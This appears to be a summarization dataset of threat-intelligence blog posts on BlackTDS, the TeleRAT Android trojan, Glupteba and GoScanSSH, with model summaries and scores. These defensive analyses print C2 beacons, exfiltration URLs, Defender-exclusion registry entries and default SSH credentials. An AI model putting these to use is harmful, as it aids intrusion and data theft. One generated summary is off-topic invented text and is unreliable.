to as a ""Cloud TDS."" The operators claim that their Cloud TDS can handle social engineering and redirection to exploit kits (EKs) while preventing detection by bots namely researchers and sandoxes. BlackTDS also includes access to fresh domains with clean reputations over HTTPS if required.The services offered by BlackTDS are summarized in their forum advertisements, the text of which we have left unaltered: ""Cloacking antibot tds based on our nonabuse servers from $3 per day of work. You do not need your own server to receive traffic. API for working with exploit packs and own solutions for processing traffic for obtaining installations (FakeLandings). Dark web traffic readymade solutions. Placed in 1 click hidden code to use the injection in js on any landings, including on hacked websites. Cost $6 per day, $45 per 10 days, $90 per month, FREE place on our server, FREE hosting of your file on green https:// domain. 3 DAYS FREE TEST""* Cloud Antibot Traffic Management System on our nonabuse servers* API for working with bundles of equities and custom solutions for processing traffic for obtaining installations (Faklendings). Placing your file on a green https: // domain* Placed in 1 click hidden code to use the injection in";en;{'r': 0.30919765166340507, 'p': 0.9693251533742331, 'f': 0.4688427263032606};{'r': 0.26030624263839813, 'p': 0.9525862068965517, 'f': 0.40888066267883333};{'r': 0.30919765166340507, 'p': 0.9693251533742331, 'f': 0.4688427263032606}
https://unit42.paloaltonetworks.com/unit42-telerat-another-android-trojan-leveraging-telegrams-bot-api-to-target-iranian-users/;TeleRAT: Another Android Trojan Leveraging Telegram’s Bot API to Target Iranian Users;"This post is also available in: ??? (Japanese)SummaryTelegram Bots are special accounts that do not require an additional phone number to setup and are generally used to enrich Telegram chats with content from external services or to get customized notifications and news. And while Android malware abusing Telegram's Bot API to target Iranian users is not fresh news (the emergence of a Trojan using this method called IRRAT was discussed in June and July 2017), we set out to investigate how these Telegram Bots were being abused to command and control malicious Android applications.This blog details our findings navigating through some Operational Security (OPSEC) fails while sifting through multiple malicious APK variants abusing Telegram's Bot API, including the discovery of a new Trojan we've named ""TeleRAT"". TeleRAT not only abuses Telegram's Bot API for Command and Control (C2), it also abuses it for data exfiltration, unlike IRRAT.What We Already Know- IRRATBased on previous reports, we know Telegram's Bot API was already being employed by attackers to steal information ranging from SMS and call history to file listings from infected Android devices. The majority of the apps we saw disguise themselves as an app that tells you how many views your Telegram profile received - needless to say, the information provided is inaccurate as Telegram doesn't allow for populating any such information.We continue to see IRRAT active in the wild to this date.We used the below sample for this analysis.SHA256 1d0770ac48f8661a5d1595538c60710f886c254205b8cf517e118c94b256137dTeleRAT works by creating and then populating the following files on the phone's SD Card and sending them to the upload server, after the app's first launch:""[IMEI] numbers.txt"": Contact information""[IMEI]acc.txt"": List of Google accounts registered on the phone""[IMEI]sms.txt"": SMS history1.jpg: Picture taken with the front-facing cameraImage.jpg: Picture taken with back-facing cameraFinally, it reports back to a Telegram bot (identified by a bot ID hardcoded in each RAT's source code) with the below beacon, and the application icon is then hidden from the phone's app menu:hxxp://api.telegram.org/bot[APIKey]/sendmessage?chat_id=[ChatID]?text=??? ????[IMEI]IMEI : :[IMEI]Android ID : [AndroidID]Model : [PhoneModel][IP]IMEI ??????: [IMEI]In the background, the app continues to beacon to the Telegram bot at regular intervals and listens for certain commands, as detailed below.Command Action Communication to Telegram bot call@[IMEI]@[Number] Places a call to [Number] hxxps://api.telegram.org/bot[APIKey]/sendmessage?chat_id=[ChatID]&text=call with [Number] sms@[IMEI]@[Number]@[Text] SMS [Text] to [Number] hxxps://api.telegram.org/bot[APIKey] /sendmessage?chat_id=[ChatID]&text=sent getapps@[IMEI] Saves a list of installed apps to SD Card to file named ""[IMEI] apps.txt"", uploads to upload server None getfiles@[IMEI]@[DirPath] Retrieves file listing from [DirPath], saves to SD Card as ""[IMEI]files.txt"", uploads to server None getloc@[IMEI] Starts a GPS listener that monitors location changes None upload@[IMEI]@[FilePath] Uploads file at [FilePath] None removeA@[IMEI]@[FilePath on SDCard] Deletes file at [FilePath on SDCard] https://api.telegram.org/bot[APIKey]/sendmessage?chat_id=[ChatID]&text= [FilePath on SDCard] removeB@[IMEI]@[DirPath on SDCard] Deletes [DirPath on SDCard] None lstmsg@[IMEI] Saves SMS history to SD Card as ""[IMEI]lstmsg.txt"", uploads to server None yehoo@[IMEI] Takes a picture with Front Camera, saves to SD Card as ""yahoo.jpg"", uploads to server NoneTable 1: List of IRRAT bot commandsAs the table above shows, this IRRAT sample makes use of Telegram's bot API solely to communicate commands to infected devices. The stolen data is uploaded to third party servers, several of which employ a webhosting service. Fortunately for us, these servers had several OPSEC fails. More on that further below.A New Family- TeleRATWhile sifting through IRRAT samples, using AutoFocus, we came across another family of Android RATs seemingly originating from and/or targeting individuals in Iran that not only makes use of the Telegram API for C2 but also for exfiltrating stolen information.Figure 1: pivoting in autofocus for applications using the Telegram bot APIWe named this new family ""TeleRAT"" after one of the files it creates on infected devices.We used the below sample for this analysis.SHA256 01fef43c059d6b37be7faf47a08eccbf76cf7f050a7340ac2cae11942f27eb1dPost-installation TeleRAT creates two files in the app's internal directory:telerat2.txt containing a slew of information about the device - including the System Bootloader version number, total and available Internal and External memory size, and number of cores.thisapk_slm.txt mentioning a Telegram channel and a list of commands. We investigate this Telegram channel is greater detail further below.The RAT announces its successful installation to the attackers by sending a message to a Telegram bot via the Telegram Bot API with the current date and time.More interestingly, it starts a service that listens for changes made to the Clipboard in the background.Figure 2: Code snippet that listens for clipboard changesFinally, the app fetches updates from the Telegram bot API every 4.6 second, listening for the following commands (we used Google Translate for the below Farsi (Persian) translations):Command Translation ?????? ??????? Get contacts ?????? ???? ???? Get the clipboard Clipboard set:[text] ?????? ???? Get location ?????? ??????? ???? Receive charging information All file list:/[path] Root file list:/[path] ?????? ?????? ?? Get apps 1Downloadfile/[filename] 2Downloadfile/[filename] CreateContact/[name]/[number] SetWallpaper http[URL] ?????? ???? ?? Receive (SMS) messages Sendsmsfor/[destination]/[text] MessageShow[text] ????? ???1 Take photo 1 (front camera) ????? ???2 Take photo 2 (back camera) ?????? ????? Get status ?????? ???? ?? Receive calls DeleteDir[dirname] ?????? Silent (set to Vibrate mode) ?????? Loud (set to normal Ringer mode) ????? Silent (set to Silent mode) Blacksc Blacks out phone screen Blackscf Clears black screen ??? ???? Audio recording (saves recorded audio to AUDIO123/MUSIC/rec123.m4a on SD Card) ???? ??? ???? Stop audio recording ??????? ??????? Instruction manual (Help Menu) call to [number] RESET (deletes thisapk_slm.txt and sends a new registration message to Telegram bot) ?????? ????? Get gallery (sends files from the /Dcim folder on the SD Card to Telegram bot) Delete app files or ?????? ????? Vibrate [x] (Causes phone to vibrate for x seconds, with a maximum value of 600 secs) ???? ?? Low vibration (for a duration of 150 secs) ???? ????? Medium vibration (350 secs) ???? ???? Shake too much (600 secs)Table 2: List of TeleRAT bot commandsAside from additional commands, this new family's main differentiator to IRRAT is that it also uploads exfiltrated data using Telegram's sendDocument API method.Figure 3: Code snippet showing the use of the SendDocument Telegram bot API methodTeleRAT is an upgrade from IRRAT in that it eliminates the possibility of network-based detection that is based on traffic to known upload servers, as all communication (including uploads) is done via the Telegram bot API. However, it still leaves other doors open via Telegram's bot API, since the API Keys are hardcoded in the APKs.The API allows fetching updates by two means:1.The getUpdates method: Using this exposes a history of all the commands that were sent to the bot, including usernames from which the commands originated. From the bots that were still responding and had an update history (incoming updates are only kept for 24 hours as per Telegram's policy), we were able to find bot commands originating from four Telegram accounts, shown below.Figure 4: Telegram usernames revealed from bot command histories2. Using a Webhook: Telegram allows redirecting all bot updates to a URL specified by means of a Webhook. Their policy limits these Webhooks to HTTPS URLs only. While most of the Webhooks we found used certificates issued by Let's Encrypt with no specific registrar information, some of them led us back to the world of third party webhosting and open directories. Let's Encrypt has been notified about this activity.A sample of only a few Webhooks we found are shown below. hxxps://mr-mehran[.]tk/pot/Bot/ in particular appears to be hosting close to 6500 bots, however, we can't confirm whether they're all used for malicious purposes.Figure 5: Webhooks found associated with some TeleRAT botsOPSEC Fails, Distribution Channels & AttributionIn our research we were able find what was clearly an image of the botmaster testing out the RAT, based on the Telegram bot interface that can be seen on the monitor pictured in the lower half of Figure 6.Figure 6: Image of botmaster testing out the RATWe were also able to find exfiltrated messages that confirmed our theory about the test run and reveals a thread in Persian Farsi seemingly discussing bot setup.""??? ???? ? ?????? ?? ?? ?????? ?? ?????? ????""Google Translation: ""Morning 6 hours online to try the robotage""While investigating attribution for TeleRAT, we noticed the developers made no effort to hide their identities in the code. One username is seen in the screenshot below.Figure 7: Telegram channel advertised in source codeLooking further into the 'vahidmail67' Telegram channel, we found advertisements for applications and builders that ran the entire gamut - from applications that get you likes and followers on Instagram, to ransomware, and even the source code for an unnamed RAT (complete with a video tutorial, shown below).Figure 8: Screenshot from a Telegram channel advertising & sharing a RAT source codeAside from the Telegram channel, while looking for references to certain TeleRAT components we stumbled upon some threads on an Iranian programmers' forum advertising the sale of a Telegram bot control library. The forum is frequented by some of the developers whose code is heavily reused in a big portion of the TeleRAT samples we came across.Figure 9: Advertisement for sale of a Telegram bot control libraryThe forum goes the extra mile to mention all content is in accordance with Iran's laws. However, it's hard to see any non-malicious use for some of the code advertised there or written by developers that frequent it - for instance, a service that runs in the background listening for changes to the Clipboard (pictured in the code snippet in Figure 3 further above).Figure 10: Forum DisclaimerOverall, TeleRAT pieces together code written by several developers, however, due to freely available source code via Telegram channels and being sold on forums, we can't point to one single actor commanding either IRRAT or TeleRAT and it appears to be the work of several actors possibly operating inside of Iran.VictimologyAs we investigated these RATs, we also started looking at how victims were getting infected. Further investigating, we witnessed several third-party Android application stores distributing seemingly legitimate applications like ""Telegram Finder"", which supposedly helps users locate and communicate with other uses with specific interests, like knitting. Also, we've witnessed several samples distributed and shared via both legitimate and nefarious Iranian Telegram channels.Figure 11: leIranian third-party application storeLooking closer at the malicious APKs we were able to get an understanding of common application naming conventions and functionality across the board.Figure 12: 'Telegram finder' applicationBased on the samples we analysed, the three most common application names for both IRRATand TeleRAT are:Native App Name Translated App Name ??????? ??? Profile Cheer ?????? ??? ?????? Telegram Finder telegram hacker N/AAdditionally, there were several malicious APKs disguised as fake VPN software and/or configuration files, such as ""atom vpn"" and ""vpn for telegram.There appears to be a total identified victim count of 2,293 at the time of writing, based on the infrastructure we analysed. There appears to be a rather small range of geographically dispersed victims, with 82% of having Iranian phone numbers.Iran 1894 Pakistan 10 India 227 Afghanistan 109 United Kingdom 53There may also be additional infrastructure or variants we were unaware of at the time of writing. That said, the number of victims likely residing within Iran far exceeds the victim count for any other country.ConclusionPart of dissecting and understanding new threats involve looking closer at already established campaigns and malware variants. This is a perfect example of just that, looking closer at a previously established malware family to better understand it's current and possibly changed capabilities.While malware leveraging the Telegram bot API is not necessarily new, we were able to identify a new family, TeleRAT, hiding entirely behind Telegram's API to evade network-based detection and exfiltrate data. Leveraging intelligence from AutoFocus, accessible attacker infrastructure, and other open source intelligence we were able to paint an accurate picture of an ongoing operation leveraging Telegram's API and targeting users via third party application sites and social media channels.Taking some basic precautions can help users protect themselves from malicious applications like TeleRAT, such as:Avoid third-party application stores or sources.Don't allow application sideloading on your device.Ensure the application you are installing is official, regardless of source.Closely review and scrutinize application permission requests prior to installation.Palo Alto Networks customers are protected from this threat by:WildFire detects all TeleRAT and IRRAT files with malicious verdicts. AutoFocus customers can track these samples with the IRRAT and TeleRAT Traps blocks all of the APK files associated with TeleRAT and IRRAT.APPENDIXTelegram usernames found commanding IRRAT or TeleRAT Ahmad_ghob My_LiFe_M_a_H_s_A mmm1230a";The ITSecurity report provides a comprehensive overview of the current state of IT security in the organization. The report covers a wide range of topics, including IT security policies, procedures, and best practices, as well as IT security threats and vulnerabilities. The report also provides recommendations for improving IT security, such as implementing more stringent password policies, using twofactor authentication, and regularly backing up data. TeleRAT is an upgrade from IRRAT in that it eliminates the possibility of networkbased detection that is based on traffic to known upload servers, as all communication (including uploads) is done via the Telegram bot API. However, it still leaves other doors open via Telegram's bot API, since the API Keys are hardcoded in the APKs. The API allows fetching updates by two means:1.The getUpdates method: Using this exposes a history of all the commands that were sent to the bot, including usernames from which the commands originated. From the bots that were still responding and had an update history (incoming updates are only kept for 24 hours as per Telegram's policy), we were able to find bot commands originating from four Telegram accounts, shown below.Figure 4: Telegram usernames revealed from bot command histories2. Using a Webhook: Telegram allows redirecting all bot updates to a URL specified by means of a Webhook. Their policy limits these Webhooks to HTTPS URLs only. While most of the Webhooks we found used certificates issued by Let's Encrypt with no specific registrar information, some of them led us back to the world of third party webhosting and open directories. Let's Encrypt has been notified about this activity.A sample of only a few Webhooks we found are shown below. hxxps://mrmeh;en;{'r': 0.15789473684210525, 'p': 0.8181818181818182, 'f': 0.2647058796410035};{'r': 0.11483516483516483, 'p': 0.774074074074074, 'f': 0.1999999977500515};{'r': 0.15789473684210525, 'p': 0.8181818181818182, 'f': 0.2647058796410035}
https://www.welivesecurity.com/2018/03/22/glupteba-no-longer-windigo/;Glupteba is no longer part of Windigo;"Latest ESET research strongly suggests that Glupteba is no longer tied to the infamous Operation Windigo.Our recent research on Linux/Ebury, the core component of Operation Windigo, led us to look at other components in Windigo's ecosystem to see if they are still active and part of the same operation. During this process, we took a look at Win32/Glupteba, an open proxy previously distributed by exploit kits deployed as part of Operation Windigo. The result of our latest analysis strongly suggests that Glupteba is no longer tied to Operation Windigo.In this blog post, we share the results of our investigation. We provide information about the current distribution mechanisms of Glupteba, a short analysis of the network traffic going through the proxy, and we discuss the relationship between Glupteba and Windigo. Finally, we give a technical analysis of the current state of the Glupteba binary.Glupteba distribution over timeBrief historyOver time, Glupteba is known to have used various distribution methods. ESET researchers have tracked the distribution of Glupteba for the last seven years. We'll give a brief overview of its evolution.Back in 2011, ESET researchers working on the infamous TDL-4 bootkit discovered that, as explained in this blogpost, it was being used as a downloader to fetch additional malware. Glupteba was found to be one of many malware variants it installed. TDL-4 operators were most likely selling a distribution service on black markets.Three years later, ESET's investigation into Operation Windigo revealed that part of the attackers' infrastructure of compromised Linux servers was used to redirect a certain proportion of HTTP requests through trojanized instances of web servers (Apache httpd, lighttpd and nginx). Redirected requests would hit DNS servers under the control of Windigo's operators, which resolved the A record to the IP address of the final redirection targets. These usually hosted exploit kits. Upon successful exploitation, Glupteba would be installed.The ties between Windigo and Glupteba didn't end there. Glupteba's C&C servers were also hosted on machines that were part of Windigo's botnet. Furthermore, the sole purpose of Glupteba at the time was to relay spam jobs fetched from Windigo's infrastructure. It is, however, hard to say if Glupteba was operated by the same individuals as the Windigo botnet or if it was some kind of service provided by Windigo's operators reselling usage of their infrastructure.Current distribution schemeOnce again, Glupteba's distribution vector changed. It is not distributed via Windigo's infrastructure anymore. Glupteba is now part of its own botnet and is distributed by MSIL/Adware.CsdiMonetize.AG, which is used to install many different malware families - suggesting a Pay-Per-Install scheme. In addition to installing Glupteba, we've seen it deploying Adware, Bitcoin mining agents and various PUAs (Potentially Unwanted Applications). MSIL/Adware.CsdiMonetize.AG doesn't directly install Glupteba.AY, instead it downloads its dropper, which is responsible for registering the bot to its C&C, adding exclusions to Windows Defender and the Windows firewall as well as setting the environment to install Glupteba.The query to register the bot contains multiple pieces of information about the victim's machine. Here's an example of such a query:POST /bots/register HTTP/1.1Host: burnandfire5.comUser-Agent: Go-http-client/1.1Content-Length: 400Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzipData[appname]=SolitaryBrook&Data[arch]=32&Data[av]=&Data[build_number]=7601&Data[compaign_id]=&Data[cpu]=<CPU_SPEC>&Data[defender]=1&Data[exploited]=1&Data[firewall]=1&Data[gpu]=<GPU_INFO>&Data[is_admin]=1&Data[os]=<OS_INFO>&Data[username]=<USERNAME>&Data[version]=71The Windows Registry value HKCU\Software\Microsoft\TestApp\UUID is also created. It is needed by Glupteba to execute successfully. This value's data must not be empty.Finally, the following registry entries are created to add exclusion rules to Windows Defender and the Windows Firewall:HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Users\<USERNAME>\AppData\Roaming\EpicNet Inc\CloudNet = 0HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes\cloudnet.exe = 0HKLM\SYSTEM\ControlSet001\services\SharedAccess\Parameters\FirewallPolicy\FirewallRules\{09E3DB75-DE77-4B2D-A351-C745D9A15617} = ""v2.10|Action=Allow|Active=TRUE|Dir=In|App=C:\Users\<USERNAME>\AppData\Roaming\EpicNet Inc\CloudNet\cloudnet.exe""According to ESET's telemetry, Glupteba has been seen in 180 different countries since the beginning of 2017. Three countries jointly account for 25% of all detections - Ukraine, the Russian Federation and Turkey. Figure 1 shows the distribution per country of the detections we observed.Proxy usage analysisDuring ESET's research into Operation Windigo, Glupteba's sole purpose was to relay spam jobs to their final recipients. We wanted to see if the use of Glupteba has changed since then. During November 2017, we captured network traffic going through an infected node for a duration of four days. Note that we didn't decrypt the HTTPS traffic, so our visibility was limited to non-encrypted network protocols. Our analysis showed that Glupteba is no longer limited to sending spam. It is now primarily used by various automated systems. While Glupteba's operators might use the proxy, we do believe that the use of Glupteba is sold to third-party users as a proxy service. Here, we provide information about the most interesting traffic we observed.The first thing we noticed is that Glupteba is still used to relay spam messages to their final recipients. Here's an example of a spam message:From: ""Ella Dmhfey"" <Ella87@bilanzgewinn.at>To: ""???????"" <??????????@gmail.com>Subject: ?????????? kaufen Sie Se-xpowerDate: Fri, 10 Nov 2017 14:18:10 +0100MIME-Version: 1.0Content-Type: text/plain,charset=""iso-8859-1?Content-Transfer-Encoding: 7bitGuten Tag ????????? ,Damit kriegen Sie Ihre Dame zum Hoehepunkt.?????????: http://www.sexpillen-versandhaus[.]info/shopWe've also seen Glupteba used to attempt password-reuse attacks. Glupteba provides some level of anonymity to the attackers since the IP address of the proxy user is never exposed to the actual targeted server. Moreover, it allows spreading the queries across multiple IP addresses, thus reducing the risk of being banned by the website targeted by the password-reuse attack. We've seen such attacks performed on three domains:Table 1. Domains targeted that don't use HTTPS Domain name Short description adfoc.us URL shortener service where users are paid per visit bonusbitcoin.co Free bitcoin faucet website social.tunecore.com Music distribution websiteThere are probably more targeted domains. Based on the server_name extension field of the ClientHello structure used during the TLS handshake, we know the domain names that were accessed even when HTTPS was used. This gives insight into what websites may have been targeted. Table 2 a list of such domain names along with the associated authentication URLs. They are sorted with the most frequently visited on the top.Table 2. Domains in server_name certificate field Server name Authentication URL auth.mail.ru https://auth.mail.ru/cgi-bin/auth www.instagram.com https://www.instagram.com/accounts/login/ajax/ store.steampowered.com https://store.steampowered.com/login/dologin/ www.amazon.com https://www.amazon.com/ap/signin auth.riotgames.com https://auth.riotgames.com/authz/auth vk.com https://vk.com/login global.americanexpress.com https://global.americanexpress.com/myca/logon/emea/action www.facebook.com https://www.facebook.com/login/device-based/regular/login/ signin.ea.com https://signin.ea.com/p/web2/login account.t-mobile.com https://account.t-mobile.com/svr/authenticate www.linkedin.com https://www.linkedin.com/uas/login-submit www.westernunion.com https://www.westernunion.com/wuconnect/rest/api/v1.0/CustomerSignOn www.paypal.com https://www.paypal.com/signin www.britishairways.com https://www.britishairways.com/api/grant auth.api.sonyentertainmentnetwork.com https://auth.api.sonyentertainmentnetwork.com/login.jsp account.sonymobile.com https://account.sonymobile.com/api/ng/signin www.expedia.com https://www.expedia.com/user/signinAnother example of a user proxying automated system traffic through Glupteba targeted www.omegle.com. Omegle is a website where two strangers can meet in a private chat room. What we observed is a bot joining a chat room and trying to trick the other user into clicking a link. It seems that this service is a popular target for bots. Most of the interactions we captured were between two bots trying to lure each other into either joining Kik Messenger, an instant messaging mobile app, or clicking shortened URLs that redirect to adult websites.Example of two bots interacting with each other:guest> heyystranger> my name is Tomasastranger> im female .stranger> from Rio de aneiro,Brazilstranger> ready to talk, enter here:stranger> bit.ly/<REDACTED>guest> 18 femaleguest> wanena etrade picturesh ?guest> zyari.site/<REDACTED>guest> messsage me theree ill sendc you sxome mor8eguest> ok we2ll im goinn 2 getwt off byeWe've also come across bots trying specially crafted HTTP POST requests in an attempt to find webshells. Domains were tried one after the other in ascending alphabetical order, which suggests they are programmatically processing a list of domains.Discussing links with WindigoWhen we decided to revisit Glupteba, it was primarily because we wanted to see if it was still associated with Operation Windigo, our analysis leads us to believe that the two are no longer affiliated. Let us provide the reasons for such conclusions.The first thing we looked at is the C&C servers used by Glupteba. Enumerating the IP addresses we found, none of them matched any previously known Ebury-compromised servers. Moreover, the new C&C servers have a lot of ports open, while the previous ones had only one DNAT and one SNAT rule to reroute the traffic to the actual C&C server. Having so many ports open on a compromised server would be very noisy, which is not the modus operandi of Windigo's operators.As documented in the Operation Windigo whitepaper, the client connecting to Glupteba used to send an HTTP GET request on port 25 to a machine compromised by Ebury before starting to send spam jobs. This is no longer the case: spam jobs go directly through the proxy without any kind of prologue. Also, the spam messages themselves don't look like those we used to see during Operation Windigo, where the messages led to a dating website. While it could be argued that the current spam messages, trying to sell sexual enhancement pills to ""get your lady to the climax"", are a logical sequel to the previous one, we believe they are unrelated.Finally, the distribution itself is not related to Windigo anymore. As mentioned previously, it is now distributed by MSIL/Adware.CsdiMonetize.AG.For all these reasons, we believe that Glupteba is no longer linked with Operation Windigo.Technical analysisIn this section, we provide a technical analysis of the samples of Glupteba we looked at during this research. The first thing we noticed is that the current samples don't look like those we analyzed back in 2014. We believe Glupteba has been rewritten from scratch. Whereas Glupteba used to be a fairly small and simple program, nowadays it has become a huge and very complex C++ program. It used to have around 70 functions. Now, it has more than 3600 functions.Glupteba now statically links to the Boost C++ libraries as shown in Figure 3. To communicate over sockets, it uses the Windows Sockets APIs WSASend and WSARecv instead of send and recv.PersistenceGlupteba acquires persistence by adding an entry in the Run registry key. Thus, every time Windows boots up, Glupteba will be launched. Here's the entry that is created:HKCU\Software\Microsoft\Windows\CurrentVersion\Run\CloudNet = ""%APPDATA%\EpicNet Inc\CloudNet\cloudnet.exe""Other entare also created in the Windows Registry. The most interesting are the following:HKCU\Software\EpicNet Inc.\CloudNet\Value = ""20180223""HKCU\Software\EpicNet Inc.\CloudNet\GUID = ""CDC0432A-0298-40B1-9A71-D61F94C013A7""The GUID entry is set to the bot id that is created via a call to CoCreateGuid. As for the Value entry, it contains the PE timestamp of Glupteba's binary.C&C communicationFrom a networking perspective, there are no significant changes between the samples we documented in our Operation Windigo paper and the current version. When launched, Glupteba sends the same beacon to its C&C and the response contains the session and the port that Glupteba will connect to for retrieval of the proxying jobs. Refer to the earlier whitepaper for more information about the protocol.Beacon sent to the C&C:GET/stat?uptime=100&downlink=1111&uplink=1111&id=05AA812F&statpass=bpass&version=20171106&features=30&guid=68794E51-0DBC-4CF6-BD98-8B18FE3E0A18&comment=20171106&p=0&s= HTTP/1.0The C&C servers are stored encrypted in the binary. Once decrypted, they look like this:'server-%s.sportpics[.]xyz:30,server-%s.kinosport[.]top:30,'The number after the colon is the maximum range of the server numbers. In this case, '30' means that there are 30 domain names generated by formatting the domain string with numbers from 1 to 30. When contacting the C&C server, one of those domains is randomly selected and the GUID of the compromised machine is prepended as a subdomain to the chosen server resulting in a domain like this:Example of a C&C server:68794E51-0DBC-4CF6-BD98-8B18FE3E0A18.server-1.sportpics[.]xyzGlupteba also sends a second GET request to its C&C server in order to update information about the victim's machine specifications. Here's what the request looks like:GET/update.php?uid=<BOT_ID>&version=<VERSION>&OS=<OS>&have_admin=1&mys=<C&C_SERVERS>&build=<PE_TIMESTAMP>&cpu=<CPU>&video=<VIDEO_CARD>&ram=<GB_OF_RAM> HTTP/1.0String encryptionGlupteba's strings are encrypted using a custom algorithm. The decryption process uses a 16-byte key and has three separate phases. The key is different for each build. During the first phase, the Mersenne Twister pseudorandom number generator (PRNG) is used. The algorithm is seeded with the first four bytes of the key. Then, each byte of the cipher is XORed with the next byte generated by the PRNG.There are three different variants of the second phase. One uses the Rabbit cipher, another uses a second round of XOR operations similar to the one from the first phase, but with a different seed derived from the key. The only variant that is used in the samples we analyzed is the third one. It consists of an XOR loop with the key.The third and final phase is another XOR loop with a value that is computed from the output of the second phase and some immediate values.In our GitHub repository, we provide a script to decrypt all the strings. Since the Mersenne Twister PRNG implementation of Python varies a bit from the one used by Glupteba, we also provide a Python implementation of the PRNG. Make sure the directory where it is located is in your %PYTHONPATH% before launching the string decryption script. You can do so by running this command in IDA's Python interpreter:sys.path.append(<PATH_TO_SCRIPT>)ConclusionThe Glupteba operators persist in finding ways to distribute their malware despite the relentless efforts of the information security community to disrupt their operations. After the exposure of Operation Windigo, they just moved to other tactics to get their malware spread to computers all around the globe.The complete rewriting of their tools and its current distribution shows that the individuals behind Glupteba are still very active. Such efforts suggest that the open proxy market must be a very lucrative one, and that we're unlikely to witness the disappearance of Glupteba in the near future.IoCsFile hashes SHA-1 Filename Detection name B623F4A6CD5947CA0016D3E33A07EB72E8C176BA cloudnet.exe Win32/Glupteba.AY ED310E5B9F582B4C6389F7AB9EED17D89497F277 cloudnet.exe Win32/Glupteba.AY F7230B2CAB4E4910BCA473B39EE8FD4DF394CE0D setup.exe MSIL/Adware.CsdiMonetize.AG 70F2763772FD1A1A54ED9EA88A2BCFDB184BCB91 cloudnet.exe Win32/Glupteba.AY 87AD7E248DADC2FBE00D8441E58E64591D9E3CBE cloudnet.exe Win32/Glupteba.AY 1645AD8468A2FB54763C0EBEB766DFD8C643F3DB csrss.exe Win32/Agent.SVEGlupteba C&C server domainsserver-{1,30}[.]ostdownload.xyzserver-{1,30}[.]travelsreview.worldserver-{1,30}[.]bigdesign.websiteserver-{1,30}[.]sportpics.xyzserver-{1,30}[.]kinosport.topserver-{1,30}[.]0ev.ruserver-{1,30}[.]0df.ruserver-{1,30}[.]0d2.ruserver-{1,30}[.]0d9.ruGlupteba C&C server IP addresses5[.]101.6.1325[.]79.87.1395[.]79.87.1535[.]8.10.19437[.]48.81.15146[.]165.244.12946[.]165.249.16746[.]165.249.19546[.]165.249.20146[.]165.249.20346[.]165.250.2578[.]31.67.20578[.]31.67.20680[.]93.90.2780[.]93.90.3280[.]93.90.6980[.]93.90.7280[.]93.90.7880[.]93.90.8481[.]30.152.2585[.]114.135.11385[.]114.141.8189[.]163.206.13789[.]163.206.17489[.]163.212.991[.]121.65.9891[.]216.93.12691[.]216.93.20109[.]238.10.78178[.]162.193.193178[.]162.193.195178[.]162.193.66178[.]162.193.86193[.]111.140.238193[.]111.141.213212[.]92.100.114212[.]92.100.115213[.]202.254.161213[.]5.70.9217[.]79.189.227Agent.SVE C&C server domainsfinancialtimesguru[.]comcomburnandfire5[.]comSign up to receive an email update whenever a new article is published in our Ukraine Crisis - Digital Security Resource Center Submit";The latest ESET research strongly suggests that Glupteba is no longer tied to the infamous Operation Windigo. Our recent research on Linux/Ebury, the core component of Operation Windigo, led us to look at other components in Windigo's ecosystem to see if they are still active and part of the same operation. During this process, we took a look at Win32/Glupteba, an open proxy previously distributed by exploit kits deployed as part of Operation Windigo. The result of our latest analysis strongly suggests that Glupteba is no longer tied to Operation Windigo. In this blog post, we share the results of our investigation. We provide information about the current distribution mechanisms of Glupteba, a short analysis of the network traffic going through the proxy, and we discuss the relationship between Glupteba and Windigo. Finally, we give a technical analysis of the current state of the Glupteba binary. Glupteba is still being used to relay spam messages to their final recipients. It is also being used to attempt passwordreuse attacks. Glupteba is no longer associated with Operation Windigo. GET/stat?uptime=100&downlink=1111&uplink=1111&id=05AA812F&statpass=bpass&version=20171106&features=30&guid=68794E510DBC4CF6BD988B18FE3E0A18&comment=20171106&p=0&s= HTTP/1.020171106GET/stat?uptime=100&downlink=1111&uplink=1111;en;{'r': 0.09807516040329972, 'p': 0.9727272727272728, 'f': 0.1781848442976676};{'r': 0.06756109247724006, 'p': 0.9276315789473685, 'f': 0.12594908314710937};{'r': 0.09807516040329972, 'p': 0.9727272727272728, 'f': 0.1781848442976676}
https://blog.talosintelligence.com/goscanssh-analysis/;Forgot About Default Accounts? No Worries, GoScanSSH Didn’t;"This blog post was authored by Edmund Brumaghin, Andrew Williams, and Alain Zidouemba.Executive SummaryDuring a recent Incident Response (IR) engagement, Talos identified a new malware family that was being used to compromise SSH servers exposed to the internet. This malware, which we have named GoScanSSH, was written using the Go programming language, and exhibited several interesting characteristics. This is not the first malware family that Talos has observed that was written using Go. However, it is relatively uncommon to see malware written in this programming language. In this particular case, we also observed that the attacker created unique malware binaries for each host that was infected with the GoScanSSH malware. Additionally, the GoScanSSH command and control (C2) infrastructure was observed leveraging the Tor2Web proxy service in an attempt to make tracking the attacker-controlled infrastructure more difficult and resilient to takedowns.Initial Infection ProcessThe initial infection vector leveraged by GoScanSSH was likely an SSH credential brute-force attack against a publicly accessible SSH server that allowed password-based SSH authentication. In this particular series of attacks, the attacker was leveraging a word list containing more than 7,000 username/password combinations. Once the attacker has discovered a valid credential set that allows successful SSH authentication, a unique GoScanSSH malware binary is then created and uploaded to the compromised SSH server. The malware is then executed, thus infecting the system.The username/password combinations used by this malware appear to target weak or default credentials across a range of Linux-based devices. The following usernames are used by the malware to attempt to authenticate to SSH servers:adminguestoracleosmcpiroottestubntubuntuuserAmong others, these credential combinations specifically targeted the following:Open Embedded Linux Entertainment Center (OpenELEC)Raspberry PiOpen Source Media Center (OSMC)Ubiquiti device default credentialsJailbroken iPhonesPolyCom SIP phone default credentialsHuawei device default credentialsAsterisk default credentialsVarious keyboard patternsWell-known commonly used passwordsAdditional details regarding the specific operation of the GoScanSSH malware and available functionality found within this malware can be found in the following section.Malware OperationsGoScanSSH is a malware family written using the Golang (Go) programming language targeting Linux systems. During the course of our analysis, Talos discovered more than 70 unique malware samples associated with the GoScanSSH malware family. We have observed examples of GoScanSSH samples that were compiled to support multiple system architectures including x86, x86_64, ARM and MIPS64. While analyzing the MIPS64 version of GoScanSSH, Talos identified a thread where a Ubiquiti Enterprise Gateway Router user found the malware running on their router, indicating that this malware is also being distributed and executed on a variety of device types. Talos has also observed multiple versions (e.g, versions 1.2.2, 1.2.4, 1.3.0, etc.) of this malware active in the wild, indicating that this threat is continuing to be actively developed and improved upon by the attackers.Immediately following infection, the GoScanSSH malware attempts to determine how powerful the infected system is. This is accomplished by determining how many hash computations can be performed within 